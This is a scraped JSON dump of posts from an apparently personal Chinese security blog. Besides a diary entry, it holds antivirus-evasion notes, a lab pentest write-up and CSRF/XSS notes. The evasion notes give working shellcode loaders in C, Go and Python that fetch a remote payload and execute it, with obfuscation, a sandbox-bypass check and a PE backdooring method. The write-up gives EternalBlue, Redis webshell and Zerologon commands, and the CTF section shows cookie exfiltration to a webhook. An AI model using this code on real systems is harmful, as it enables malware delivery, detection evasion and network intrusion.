vscode之类的软件，害怕看公众号的文章，完完全全的学不进去，又干着急\n就在这时我得到了参加西湖论剑线下决赛的资格，我以为我抓住了希望，我可以改变颓废的状态去拼一把。不过显然西湖论剑是神仙打架，我等小毛贼也只能混个低保，但参加这种大型比赛，见到那么那么多nb的师傅真的给我感触很大。比赛完回来之后个人生活上发生一点啸变动，同时预期的3月中旬的线下复课也因为疫情而取消了，具体时间待定。不知道别的学生再得知这个消息时什么反应，而我自身的感觉就是当头一棒。我之前总是自诩自学能力强，但在家学习真的跟坐牢无异，看上去吃穿不愁，但就像是个精致的笼子一般，所有触角都被盖上了胶布。不仅是心理上煎熬，身体上也在报警。长期的不良坐姿导致腰椎脊柱颈椎都出了问题，还有不停地脱发更加剧了我的恐慌。一直萎靡的学习状态让我一直提不起劲，这样的提不起劲又刺激我情绪更加低落，完成了一个黑恶的闭环。我尝试去找人倾诉，无果，谁愿意当别人的情绪垃圾桶呢？接着就开始持续性的失眠，愈演愈烈。加上我本身网上冲浪的属性点实在是太高了，导致浸淫在虚拟文化中越来越久之后逐渐失去了与现实的边界\n某天晚上我开始尝试找回我的现实生活时，我发现失去了一切。我无法再找到合适的语言描述这种感觉，但可能它十分接近“失控”。在我摆烂的几个月里别人都没有停下脚步，技术水平不断提升，而我还是之前那个需要别人带的超级无敌大菜鸡。可能会有人觉得这有啥啊，再迎头奋起直追不就行了？但对于我来说接受这样的现实本身就是一个巨大的挑战。我害怕失败，无法接受这样的自己，这样废物的自己，我开始抱怨讨厌的环境，同时不停地进行自我否定，看到的所有东西都会像针一样刺进心里。那天凌晨1点，戴着耳机单曲循环《What Other People Say》，每次听到\u0026quot;I used to call my mum every Sunday，So she knew her love wasn’t far away，But now I’m all fucked up out in LA，Cause I care more about what other people say，I used to not take chances with god’s name，But it’s been so long since I last prayed，And now I’m all fucked up and my heart’s changed，Cause I care more about what other people say\u0026quot;，我唯一会的也就只是哭了\n之前刷知乎时关注了一个问题“有什么事是低谷期才会明白的”，但我知道有一个回答是最不该出现在这个问题下面的，那就是“已经处于低点，再往前就是向上”，这句话谁说谁傻逼，因为现实会告诉你还有负数可以接着跌——不过有谁会在意一个路边被踩扁了的可乐罐子的命运呢？我害怕水群，害怕点开最新比赛的wp，害怕点开最新漏洞的通报，害怕点开知识星球的红点，这种垃圾一样的状态是我之前鄙视的，而现在我只能看着自己溺死却无能为力，活成了我自己最讨厌的样子，面目可憎\n能写下这些文字的我情绪已经稳定了很多，但不可否认的是前面所有犯下的错误都必须我自己全责买单，持续了110天的摆烂带来的是一笔烂账，这些苦果也必须我自己吞下。以一个旁观者视角来看，这太他妈不成熟了吧，搞砸了那么多，这也是人能干出来的事？连自己都管理不好，就这？就这还学网安？确实，真是百年不遇的蠢蛋才能干出来这种事，持续地打理不好自己的情绪和生活，让身边的人担心和难受，真的相当失败。但蠢蛋也有改变的权利吧，我想我应该可以，并且必须可以，我要找回之前的我\n一句谚语是这样的：April showers bring May flowers，四月雨带来五月花。经历了如此操蛋的三个月，我已不敢奢求太多，只想以一个接近良好的状态来迎接之后的挑战和之前的欠债，努力去做，并且对结果无悔，能对得起自己\n2022年4月30日凌晨2点55分，周六于家中\n","date":"2022-04-30T03:02:00+08:00","permalink":"https://amiaaaz.github.io/life/short-diary-in-april/","section":"life","tags":[],"title":"困于家中3个月有感"},{"categories":["NOTES\u0026SUMMARY"],"contents":"shellcode注入 PESecurity可以检测目标对象是否开启ASLR等安全选项\nImport-Module .\\Get-PESecurity.psm1 Get-PESecurity -file \u0026lt;signle file path\u0026gt; Get-PESecurity -directory \u0026lt;directory path for DLLs \u0026amp; EXEs\u0026gt; 选择目标对象的标准：\n大小\u0026lt;10mb，利于传输 本身为大众文件，便于隐蔽 不受ASLR或DEP等安全功能的保护 最好本身有使用网络通信的合法功能 这里选择的是HashCalc.exe\n首先在在代码区段中创建新的节头，或在内存中找到合适的位置植入我们的shellcode 用Lord PE打开目标程序，并在区段表底部添加新段.ame，并将VSize和RSize都增加0x1000（4096字节），并设置可读可写可执行\n此时直接运行会失败，因为我们添加了一个1000h字节的新段，但是该区段为空\n先简单填充1000个0x00看程序是否正常运行，这里用的是HxD（注意要填充到文件末尾）\n可以正常运行\n劫持程序执行流程 首先在Ollydbg中转到内存部分（alt+M），可以看到我们新加的.ame，并且有RWE权限\n接下来我们要将程序的执行流劫持到我们新添加的.ame段中，使最终执行程序时进入放有shellcode的.ame部分\n首先复制前3个操作码（之后回复执行流程时需要）\n我们复制.ame的起始地址00482000，并把程序入口处的push ebp改为jmp 00482000并保存为新的exe\n再次运行时就已经不会展示正常的页面了\n填充msf🐎 这里用messagebox做填充\nmsfvenom -p windows/messagebox text=\u0026#34;it\u0026#39;s demo\u0026#34; -f hex 在jmp 00482000处enter跟随跳转，把payload复制到null的部分，保存为新的exe\n成功运行\n回复程序的正常执行流程 首先将shellcode最后一句跳转改为nop，使用popfd和popod回复堆栈操作，然后将原程序起始位置的汇编码复制到这里，最后跳转回原来的执行地址\n就可以在弹messagebox之后继续HashCalc原程序了\n同理，我们可以插入msf🐎\nmsfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 4 -b \u0026#39;\\x00\u0026#39; lhost=192.168.31.29 lport=4788 -f hex 注意此处选用x86/shikata_ga_nai的encoder之后前面就不能用x64了，默认生成的都是x86的payload，并且要注意-i参数的指定，要与前面扩充的新段大小相匹配\nshellcode加载器 根据前面对🐎结构的分析，我们知道单一的shellcode是无法执行的，需要配套的shellcode loader来接收后续的stager，编写的思路都是大差不差的，以动态加载内存为例：\n接收4字节缓冲区大小 开辟内存 将socket中的值复制到缓冲区中去 读取字节到缓冲区 执行syscall 退出 这是最最最基础的loader，当考虑到免杀时，我们可以尝试使用不同的语言来编译exe（比如python, go等）、消除代码中的明显特征，或是为接收payload这一行为前加上沙盒中无法实现的条件来bypass\n下面以c的版本做主要的示例：）\n# 亲测这个encoder完全不能用到windows/x64/xxx上 之后编译exe也得用`gcc -m32 x.c -o x.exe` 必须配套32位 # 这样产生的shellcode本体可以做到基本免杀 后续的操作基于如何免杀加载 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 4 -b \u0026#39;\\x00\u0026#39; lhost=192.168.31.29 lport=4788 -f c -o t1 C 不考虑loader的裸执行（必被杀 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; unsigned char buf[] = \u0026#34;\u0026#34;; void main(){ ((void(*)(void)) \u0026amp; buf)(); } 申请动态内存加载 通常会调用kernel32的win api，常见函数和它们的作用（以c为例）\nmalloc: 分配内存 VirtualAlloc: 申请一块可读可写可执行的动态内存区域 memcpy: 从指定内存中复制内容至另一内存里 void main(){ LPVOID Memory; Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\t// 内存地址, 大小, 分配类型, 该内存的初始保护属性 memcpy(Memory, buf, sizeof(buf)); ((void(*)())Memory)(); } 内联汇编指令 *注意gcc的内联汇编与vc的不同 使用AT\u0026amp;T语法，请参照GCC内联汇编基础\nGo 通过syscall可以丝滑地调用kernel32.dll的函数\n条件触发 首先对shellcode进行简易混淆\n# https://github.com/pureqh/bypassAV/blob/main/go_shellcode_encode.py import base64 buf1 = b\u0026#34;shellcode\u0026#34; b64shellcode = base64.b64encode(buf1).decode() b64shellcode = b64shellcode.replace(\u0026#34;A\u0026#34;,\u0026#34;#\u0026#34;).replace(\u0026#34;H\u0026#34;,\u0026#34;!\u0026#34;).replace(\u0026#34;1\u0026#34;,\u0026#34;@\u0026#34;).replace(\u0026#34;T\u0026#34;,\u0026#34;)\u0026#34;) print(b64shellcode) 这里条件触发，指的是在最后指令执行前 先访问一次局域网内存在而沙箱内不存在的文件，达到bypass沙箱的效果\n// https://github.com/pureqh/bypassAV/blob/main/main.go package main import ( \u0026#34;encoding/base64\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; ) var ( kernel32 = syscall.NewLazyDLL(\u0026#34;kernel32.dll\u0026#34;) VirtualAlloc = kernel32.NewProc(\u0026#34;VirtualAlloc\u0026#34;) RtlMoveMemory = kernel32.NewProc(\u0026#34;RtlMoveMemory\u0026#34;) ) func build(ddm string) { str1 := strings.Replace(ddm, \u0026#34;#\u0026#34;, \u0026#34;A\u0026#34;, -1) str2 := strings.Replace(str1, \u0026#34;!\u0026#34;, \u0026#34;H\u0026#34;, -1) str3 := strings.Replace(str2, \u0026#34;@\u0026#34;, \u0026#34;1\u0026#34;, -1) str4 := strings.Replace(str3, \u0026#34;)\u0026#34;, \u0026#34;T\u0026#34;, -1) sDec, _ := base64.StdEncoding.DecodeString(str4) addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40) _, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(\u0026amp;sDec[0])), uintptr(len(sDec))) syscall.Syscall(addr, 0, 0, 0, 0) } func main() { u, _ := url.Parse(\u0026#34;http://192.168.31.29/pay\u0026#34;) q := u.Query() u.RawQuery = q.Encode() res, err := http.Get(u.String()) if err != nil { return } resCode := res.StatusCode res.Body.Close() if err != nil { return } var y int = 200 if resCode == y { build(\u0026#34;\u0026#34;)\t// b64 payload here } } go build -trimpath -ldflags=-H=windowsgui main.go 查杀结果是12/68，可以再对go脚本进行混淆处理\nimport random #author: pureqh #github: https://github.com/pureqh/bypassAV #use: python build.py exp = \u0026#39;\u0026#39;\u0026#39;package main import ( \u0026#34;encoding/base64\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; ) var ( {2} = syscall.NewLazyDLL(\u0026#34;kernel32.dll\u0026#34;) {3} = {2}.NewProc(\u0026#34;VirtualAlloc\u0026#34;) {4} = {2}.NewProc(\u0026#34;RtlMoveMemory\u0026#34;) ) func {5}({6} string){0} {7} :=strings.Replace({6}, \u0026#34;#\u0026#34;, \u0026#34;A\u0026#34;, -1 ) {8} :=strings.Replace({7}, \u0026#34;!\u0026#34;, \u0026#34;H\u0026#34;, -1 ) {9} :=strings.Replace({8}, \u0026#34;@\u0026#34;, \u0026#34;1\u0026#34;, -1 ) {10} :=strings.Replace({9}, \u0026#34;)\u0026#34;, \u0026#34;T\u0026#34;, -1 ) {11},_ := base64.StdEncoding.DecodeString({10}) {12}, _, _ := {3}.Call(0, uintptr(len({11})), 0x1000|0x2000, 0x40) _, _, _ = {4}.Call({12}, (uintptr)(unsafe.Pointer(\u0026amp;{11}[0])), uintptr(len({11}))) syscall.Syscall({12}, 0, 0, 0, 0) {1} func main() {0} {14}, _ := url.Parse(\u0026#34;http://192.168.31.29/pay\u0026#34;) {15} := {14}.Query() {14}.RawQuery = {15}.Encode() {16}, {18} := http.Get({14}.String()) if {18} != nil {0} return {1} {13} := {16}.StatusCode {16}.Body.Close() if {18} != nil {0} return {1} var {17} int = 200 if {13} == {17} {0} {5}(\u0026#34;\u0026#34;) // b64 payload here {1} {1}\u0026#39;\u0026#39;\u0026#39; def random_name(len): str = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; return \u0026#39;\u0026#39;.join(random.sample(str,len)) def build_AV(): lef = \u0026#39;\u0026#39;\u0026#39;{\u0026#39;\u0026#39;\u0026#39; rig = \u0026#39;\u0026#39;\u0026#39;}\u0026#39;\u0026#39;\u0026#39; var1 = random_name(random.randint(3,9)) var2 = random_name(random.randint(3,9)) var3 = random_name(random.randint(3,9)) fun1 = random_name(random.randint(3,9)) var4 = random_name(random.randint(3,9)) var5 = random_name(random.randint(3,9)) var6 = random_name(random.randint(3,9)) var7 = random_name(random.randint(3,9)) var8 = random_name(random.randint(3,9)) var9 = random_name(random.randint(3,9)) var10 = random_name(random.randint(3,9)) var11 = random_name(random.randint(3,9)) var12 = random_name(random.randint(3,9)) var13 = random_name(random.randint(3,9)) var14 = random_name(random.randint(3,9)) var15 = random_name(random.randint(3,9)) var16 = random_name(random.randint(3,9)) shellc = exp.format(lef,rig,var1,var2,var3,fun1,var4,var5,var6,var7,var8,var9,var10,var11,var12,var13,var14,var15,var16) return shellc if __name__ == \u0026#39;__main__\u0026#39;: print(build_AV()) 查杀结果12/69，可过火绒\nPython 使用内置的ctypes库可以丝滑地调用kernel32.dll的函数，唯一需要注意的是由于64位与32位系统的差异（会影响python对于指针的处理），需要在最开始设置VirtualAlloc.restype = ctypes.c_uint64\nctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 并且亲测在64位系统上无法处理msf生成的32位shellcode，惨惨\nimport ctypes ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 shellcode = b\u0026#34;\u0026#34; shellcode = bytearray(shellcode) ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)) ) # 创建一个新线程 handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) # 等待上面创建的线程运行结束 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1)) 对shellcode进行b64处理 shellcode = base64.b64decode(_shellcode) shellcode = bytearray(shellcode) hex处理 shellcode = bytearray(_shellcode.decode(\u0026#34;hex\u0026#34;)) 远程wget 注意尽量避免出现特殊字符，如果有 二次处理\nimport urllib.request, base64, codeces shellcode = urllib.request.urlopen(\u0026#39;http://192.168.1.1:8000/test.txt\u0026#39;).read()\t# b64格式的payload shellcode = base64.b64decode(shellcode) shellcode = codecs.escape_decode(shellcode)[0] shellcode = bytearray(shellcode) pickle反序列化 ctf学到的技巧不能丢，比单纯的hex, xor, b64稍微强一点点，可以配合上面的远程wget方式绕过\nimport pickle, urllib.requests, base64, codeces # 生成 shellcode = \u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\t# 上面基础款的全部代码 class A(object): def __reduce__(self): return(exec, (shellcode,)) ret = pickle.dumps(A()) ret_base64 = base64.b64encode(ret) print(ret_base64) # 加载 pickle.loads(base64.b64decode(ret_base64)) 打包exe 生成pickle payload\nimport ctypes, urllib.request, base64, codecs, pickle shellcode = \u0026#39;\u0026#39;\u0026#39;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 _shellcode = urllib.request.urlopen(\u0026#39;http://192.168.31.29/pay1\u0026#39;).read() _shellcode = base64.b64decode(_shellcode) _shellcode = base64.b64decode(_shellcode) _shellcode = base64.b64decode(_shellcode) _shellcode = codecs.escape_decode(_shellcode)[0] _shellcode = bytearray(_shellcode) ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(_shellcode)).from_buffer(_shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(_shellcode)) ) handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))\u0026#39;\u0026#39;\u0026#39; class A(object): def __reduce__(self): return(exec, (shellcode,)) ret = pickle.dumps(A()) ret_base64 = base64.b64encode(ret) print(ret_base64) 被pyinstaller或py2exe打包的部分 pack1.py\nimport ctypes,urllib.request,codecs,base64,pickle ret_base64 = b\u0026#34;\u0026#34; pickle.loads(base64.b64decode(ret_base64)) PyInstaller 打包的更多参数参见doc: Using PyInstaller，生成exe在dist文件夹中\npip3 install pyinstaller pyinstaller --noconsole --onefile pack1.py -n demo1 # --noconsole 无黑框 # --onefile 单一文件 # -i 指定favicon # -n 生成exe名字 就以这样最简单的方式制作的加载器的查杀情况是22/66，可以直接过火绒\npy2exe（*亲测 生成的exe文件大小小于PyInstaller 但一定概率无法执行 ） 中间媒介pack2.py\nfrom distutils.core import setup import py2exe setup( options={ \u0026#39;py2exe\u0026#39;: { \u0026#39;optimize\u0026#39;: 2, # 优化级别最高， \u0026#39;bundle_files\u0026#39;: 1, # 将生成的调用文件打包进exe文件 \u0026#39;compressed\u0026#39;: 1, # 压缩 }, }, windows=[{\u0026#34;script\u0026#34;: \u0026#34;pack1.py\u0026#34;}], #需要打包的程序的文件路径，windows-\u0026gt;GUI exe的脚本列表,console-\u0026gt; 控制台exe的脚本列表 zipfile=None, # 不生成library.zip文件，则捆绑在可执行文件中 ) pip3 install py2exe python pack2.py py2exe 查杀情况14/69，可过火绒\n一开始就是做靶场的时候一时兴起看看免杀，后来发现里面门道还挺多的（我是土狗），估计以后有空还会认真学\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ Undetectable backdooring PE file | 手工shellcode注入\n恶意程序编写之免杀基础 | 免杀学习\u0026ndash;shellcode加载免杀\n几种加载shellcode的方法\ngo-shellcode | GolangBypassAV | bypassAV\nPython Shellcode加载器绕过AV\n","date":"2022-04-26T23:42:54+08:00","permalink":"https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/","section":"posts","tags":["免杀"],"title":"免杀学习笔记Ⅰ"},{"categories":["PENTEST"],"contents":" 本机 192.168.110.131\n靶机win7 192.168.110.129; 10.0.20.98\n域用户win2016 10.0.20.98; 10.0.10.111\n域控win2019 10.0.10.110\n访问192.168.110.129的80web页面，是通达OA\n/inc/expired.php页面获得版本信息\nnmap扫一下，开了445的win7，试一下永恒之蓝\nuse auxiliary/scanner/smb/smb_ms17_010 use exploit/windows/smb/ms17_010_eternalblue 得到shell，看下网络信息\n有一个内网ip 10.0.20.98\nmsf的不稳定，做进程迁移；上传npc做socks5代理\nmeterpreter \u0026gt; run post/windows/manage/migrate meterpreter \u0026gt; upload /home/kali/t00ls/nps_client_win/npc.exe C:\\\\Users npc.exe install -server=xxx -vkey=xxx npc.exe start vim /etc/proxychains4.conf # proxy dns socks5 ip port 另外传一个cs的🐎并上线\nmeterpreter \u0026gt; upload /home/kali/t3mp/cs1.exe C:\\\\Users beacon \u0026gt; sleep 5 挂代理后扫描内网c段\nproxychains4 nmap -Pn 10.0.20.98/24 发现10.0.20.99有redis，尝试redis未授权写shell（实际这里扫崩了，直接打的\n更蛋疼的是kali安装不了redis-cli，各种换源都无解，只能把原来只代给局域网的再代给公网，连出来打\n首先生成个msf🐎连给我自己的kali虚拟机，这里的坑点：两处的payload要严格一致（别多一个或少一个x64，另外lhost设为0.0.0.0才可以被代出去\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=vps_ip LPORT=port -f exe \u0026gt; msfr.exe msf \u0026gt; use exploit/multi/handler msf \u0026gt; set payload windows/meterpreter/reverse_tcp msf \u0026gt; set lhost 0.0.0.0 msf \u0026gt; set lport 2308 msf \u0026gt; run 然后在得到的shell里把之前注册好的npc取消注册后重新注册为公网的\nnpc.exe stop npc.exe uninstall npc.exe install -server=xxx -vkey=xxx npc.exe start 和之前一样，改proxychains的配置文件（不复制了），windows用proxifier（也很简单）\n2308 meterpreter\n2309 socks5 win7 win7123\nproxychains4 redis-cli -h 10.0.20.99 \u0026gt; config set dir \u0026#34;C:/phpStudy/PHPTutorial/WWW/\u0026#34; \u0026gt; config set dbfilename tx.php \u0026gt; set 1 \u0026#34;\u0026lt;?php @eval($_POST[\u0026#39;ame\u0026#39;]);?\u0026gt;\u0026#34; \u0026gt; save 连蚁剑，cs上用代理转发上线 via 10.0.20.98，所以需要再前面把公网的代理换回去，再uninstall install 一次\n注意实测pivoting-\u0026gt;Listener这样生成的反向马并不能弹回来，原因未知；解决办法是生成Listener为beacon TCP的正向马，再在之前的beacon中connect 10.0.20.99，即可上线\nmimikatz抓密码，得到非明文hash\n上传msf正向🐎并连接\nmsfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6698 -f exe \u0026gt; msfr2.exe msf \u0026gt; set proxies socks5:192.168.110.131:8879 msf \u0026gt; use exploit/multi/handler msf \u0026gt; set payload windows/x64/meterpreter/bind_tcp msf \u0026gt; set lport 6698 msf \u0026gt; set rhost 10.0.20.99 msf \u0026gt; exploit meterpreter \u0026gt; run post/windows/manage/migrate 但这里得到的session非常容易断，动不动就reason: died，只能手动把马和exploit多用几次\n定位域控\nrun post/windows/gather/enum_domain 得到域和域控信息\n添加主机对10.0.10.*的路由\nmsf \u0026gt; bg msf \u0026gt; sessions x meterpreter \u0026gt; run post/multi/mamage/autoroute nmap简单扫一下\nproxychains4 nmap -sS -Pn 10.0.10.110 用cve-2020-1472域内提权\nproxychains4 python3 cve-2020-1472-exploit.py win2019 10.0.10.110 proxychains4 python3 secretsdump.py vulntarget.com/win2019\\$@10.0.10.110 -no-pass\t# 得到administrator的hash proxychains4 python3 smbexec.py -hashes \u0026lt;hash\u0026gt; administrator@10.0.10.110 开启远程桌面\nreg add \u0026#34;HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /t REG_DWORD /v portnumber /d 3389 /f wmic RDTOGGLE WHERE ServerName=\u0026#39;%COMPUTERNAME%\u0026#39; call SetAllowTSConnections 1 netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow proxychains rdesktop 10.0.10.110 ","date":"2022-04-24T22:08:10+08:00","permalink":"https://amiaaaz.github.io/2022/04/24/vulntarget-a-notes/","section":"posts","tags":["渗透靶机"],"title":"vluntargetA靶场笔记"},{"categories":["NOTES\u0026SUMMARY"],"contents":"前端安全系列（二）：如何防止CSRF攻击？\nSelf-XSS 变废为宝的场景\nCSRF 跨站请求伪造，构造恶意页面让受害者点击，冒用受害者本地的凭证信息执行需要授权的特定操作（如注销账号等），把攻击者构造的请求当作受害者自己完成的请求，危害很大\n常见类型 GET类型 \u0026lt;img src=\u0026#34;http://bank.example/withdraw?amount=10000\u0026amp;for=hacker\u0026#34; \u0026gt; POST类型 burpsuit可直接生成，再末尾可以加上\n\u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; 将会模拟用户的POST操作直接发包\n防护\u0026amp;绕过 含CSRF payload的页面一般来自第三方网站，并且不能获取到cookie等凭据信息，只能使用\n针对这些，我们有以下的防护策略（当然会有相应的对抗措施）\n同源检测 请求头 HTTP的请求包中包含这样两个Header\nOrigin: Referer: 两个请求头理论上都不能由前端来随便修改，两者都可以用来确定请求的来源域，但略有区别\nOrigin：请求的域名，以下两种情况不存在 IE11不会在跨站CORS请求上添加Origin请求头\n302重定向\nReferer：请求的来源地址，有以下5种策略 策略名 属性 - 新 属性 - 旧 No Referer no-Referer never No Referer When Downgrade no-Referer-when-downgrade default Origin Only (same or strict)origin origin Origin When Cross Origin (strict)origin-when-crossorigin - Unsafe URL unsafe-url always 我们将其设置为same-origin，表格因此需要把Referrer Policy的策略设置成same-origin，对于同源的链接和引用，会发送Referer，referer值为Host不带Path；跨域访问则不携带Referer；例如：aaa.com引用bbb.com的资源，不会发送Referer\n设置方式有三种：CSP设置；页面\u0026lt;meta\u0026gt;标签；\u0026lt;a\u0026gt;标签增加referer policy属性\n以下几种情况不含Referer：\nHTTPS-\u0026gt;HTTP；IE6,7下的window.location.href和window.open都会丢失；Flash到另一个网站时Referer比较杂乱；\u0026lt;a\u0026gt;标签设置refererpolicy=\u0026ldquo;no-referer\u0026rdquo;\nCSRF Token 要求用户请求携带一个攻击者无法获取到的Token，服务器通过校验Token来区分正常请求和攻击请求；Token不存在于cookie中（否则又会被冒用），存于服务器的session中\n添加token 遍历DOM，对于DOM中所有的\u0026lt;a\u0026gt;和\u0026lt;form\u0026gt;标签后加入token\n对于页面加载后动态生成的HTML没有办法\n验证码或密码也可以充当这样的效果\n检验token 服务端进行校验\n缺点 实现比较复杂，需要给每一个页面都写入Token（前端无法使用纯静态页面），每一个Form及Ajax请求都携带这个Token，后端对每一个接口都进行校验，并保证页面Token及请求Token一致，这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏\ncookie相关前置 Weak Confidentiality\ncookie使用domain和path作为同源限制，不区分端口和协议(http/https)；path向下通配；domain是向上通配的，所以子域名可以写cookie到父域； // a.b.com cookie = \u0026#34;trash;domain=.b.com;\u0026#34; php处理同名cookie，取前者 Tornado处理同名cookie，后者覆盖前者；可利用这一点进行CSRF 参考：知乎某处XSS+刷粉超详细漏洞技术分析\n可以通过设置path来调整优先级 path相同长度，创建时间更早更优先；path更长更优先\npath = /admin path = /admin/\t优先 每一个cookie都有与之相关的域，这个域的范围一般通过domain属性指定 如果域与页面的域相同，称为第一方cookie，不同则称为第三方cookie；一个页面包含图片或存放其它域上的资源时，第一方的cookie也只会发送到设置它们的服务器\nXSS + CSRF 攻击流程\n首先一个xss触发点 payload中包含iframe，在框架内让受害者进行CSRF 主要看下面的例题就完事了\nin CTF [0CTF 2017]complicated xss 有两个站 http://admin.government.vip:8000（有flag）和http://government.vip/（主站）\n主站有xss点，无防护，是在当前的主站点触发xss\nadmin的那个子域的站有登录框，默认test: test弱口令可以低权限登入，登入后发现cookie的username字段有xss点（内容输出到页面的\u0026lt;h1\u0026gt;标签中），不过页面存在沙箱\n\u0026lt;script\u0026gt; //sandbox delete window.Function; delete window.eval; delete window.alert; delete window.XMLHttpRequest; delete window.Proxy; delete window.Image; delete window.postMessage; \u0026lt;/script\u0026gt; 工作方式是删除了很多window.这样的函数\nadmin子域站还有upload的功能 但是只能admin账户才可登入，我们需要获得上传部分的代码来确定我们的payload构成，但是由于web的SOP同源策略，所以两个站跨域 读不到cookie\n这里要借助cookie中的SOP策略了，仅根据domain+path来区分，不依据port+protocol，所以我们可以在子域修改父域的cookie值\ncookie=\u0026#34;username=\u0026lt;XSS code\u0026gt;;domain=.government.vip;\u0026#34; 在这种情况下，访问admin子域站时就会携带以下两条cookie\nusername=\u0026#34;XSS; domain=.government.vip\u0026#34; username=\u0026#34;test; domain=admin.government.vip; path=/\u0026#34; 由于cookie的读取是无状态的，所以上面两条cookie在被后端解析时完全相同，选取哪条cookie完全取决于后端代码的实现，响应头指出后端框架是TornadoServer/4.4.2，会导致同名cookie后者覆盖前者，使我们的攻击实现\n结合上面的，我们的大致思路是这样的：\n主站xss来设置admin子域站的cookie值 然后再跳转到admin子域站 借由这里cookie的xss触发第二个xss\n\u0026lt;script\u0026gt;xss=\u0026#34;\u0026lt;script src=//vps-ip/xss/test.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#34;;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.cookie=\u0026#34;username=\u0026#34;+xss+\u0026#34;testxss;domain=.government.vip;path=\\/;\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;location.href=\u0026#39;http://admin.government.vip:8000/\u0026#39;;\u0026lt;/script\u0026gt; test.js 获取cookie\nlocation.href=\u0026#39;http://webhook/?cookie=\u0026#39;+escape(document.cookie); 可以成功获取数据\n[Tue Mar 21 20:13:35 2017] 202.120.7.205:47632 [200]: /xss/xss_new.php?cookie=username%3Dadmin%3B%20username%3D%3Cscript%20src%3D//121.42.175.111%3A8080/xss/test.js%3E%3C/script%3Etestxss admin的sessionid设置了HttpOnly，我们还得CSRF\n由于admin子域站删除了一些函数，我们可以用iframe的骚操作来绕过\n\u0026lt;iframe id=\u0026#34;sandbox\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; window.XMLHttpRequest=document.getElementById(\u0026#39;sandbox\u0026#39;).contentWindow.XMLHttpRequest; 可以构造ajax来读admin的页面源码\n\u0026lt;script\u0026gt;xss = \u0026#34;\u0026lt;iframe id=\\\u0026#34;sandbox\\\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;script src=//vps-ip/xss/test.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#34;;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.cookie=\u0026#34;username=\u0026#34;+xss+\u0026#34;testxss;domain=.government.vip;path=\\/;\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;location.href=\u0026#39;http://admin.government.vip:8000/\u0026#39;;\u0026lt;/script\u0026gt; test.js\nwindow.XMLHttpRequest = document.getElementById(\u0026#39;sandbox\u0026#39;).contentWindow.XMLHttpRequest; var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function(){ if(xhr.readyState==4){ if(xhr.status==200){ data = xhr.responseText; imgsrc=document.createElement(\u0026#34;img\u0026#34;); imgsrc.src = \u0026#34;http://webhook/?cookie=\u0026#34; + escape(data); } } }; xhr.open(\u0026#34;get\u0026#34;,\u0026#34;/\u0026#34;); xhr.send(); 可以获得管理员页面代码\n\u0026lt;!doctype html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Admin Panel\u0026lt;/title\u0026gt; \u0026lt;script\u0026gt; //sandbox delete window.Function; delete window.eval; delete window.alert; delete window.XMLHttpRequest; delete window.Proxy; delete window.Image; delete window.postMessage; \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;h1\u0026gt;Hello \u0026lt;iframe 